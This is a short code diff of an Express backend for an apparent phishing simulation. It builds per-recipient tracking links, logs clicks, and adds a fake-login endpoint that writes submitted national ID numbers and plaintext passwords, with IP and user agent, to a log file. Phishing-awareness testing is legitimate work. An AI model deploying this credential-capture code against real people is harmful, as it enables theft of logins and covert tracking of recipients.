@@ -18,7 +18,7 @@ export const sendCustomEmail = async (req, res) => {
     const campaignId = "camp1";
     const userId = encodeURIComponent(email);
 
-    const trackingLink = `http://146.83.198.35:1606/api/email/track/${campaignId}/${userId}`;
+    const trackingLink = `http://localhost:3000/api/email/track/${campaignId}/${userId}`;
 
     const htmlMessage = `
         <p>${message}</p>
@@ -61,10 +61,35 @@ export const trackClick = (req, res) => {
         } else {
 
             console.log("Click registrado!!");
+            console.log("^^^^^^^^^^^^^^^^^^^^^^");
             console.log(logLine);
+            console.log("^^^^^^^^^^^^^^^^^^^^^^");
 
         }
     });
 
-    res.redirect("https://www.youtube.com/watch?v=zHDLUbssMIw"); // link de prueba
+    res.redirect("http://localhost:5173"); // link de prueba
+};
+
+export const simularLogin = (req, res) => {
+  const { rut, password } = req.body;
+  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
+  const agent = req.headers['user-agent'];
+  const timestamp = new Date().toISOString();
+
+  const logLine = `${timestamp} | [LOGIN SIMULADO] RUT: ${rut} | PASS: ${password} | IP: ${ip} | Agent: ${agent}\n`;
+
+  const logPath = path.resolve(__dirname, "../../logs/clicks.log");
+
+
+  fs.appendFile(logPath, logLine, (err) => {
+    if (err) {
+      console.error("Error al registrar login u.u :", err);
+      return res.status(500).json({ error: "Error al registrar" });
+    }
+
+    console.log("Login registrado:");
+    console.log(logLine);
+    res.status(200).json({ success: true });
+  });
 };
